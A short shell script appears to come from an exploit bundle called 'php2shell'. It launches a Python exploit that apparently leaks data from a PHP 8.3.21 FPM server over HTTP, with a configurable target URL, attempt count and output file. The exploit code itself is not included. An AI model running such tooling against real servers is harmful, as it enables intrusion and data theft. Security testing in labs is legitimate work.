#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
url=${PHP2SHELL_LEAK_URL:-http://127.0.0.1:${PHP2SHELL_FPM_ORIGIN_PORT:-9196}}
attempts=${PHP2SHELL_LEAK_HTTP_ATTEMPTS:-3}
output=${PHP2SHELL_LEAK_HTTP_OUTPUT:-$bundle_dir/artifacts/http-only-leak/response.bin}

case "$attempts" in
    *[!0-9]*|'') echo "PHP2SHELL_LEAK_HTTP_ATTEMPTS must be numeric" >&2; exit 2 ;;
esac

exec python3 "$bundle_dir/exploits/php8321_fpm_http_leak.py" \
    --url "$url" \
    --attempts "$attempts" \
    --output "$output"
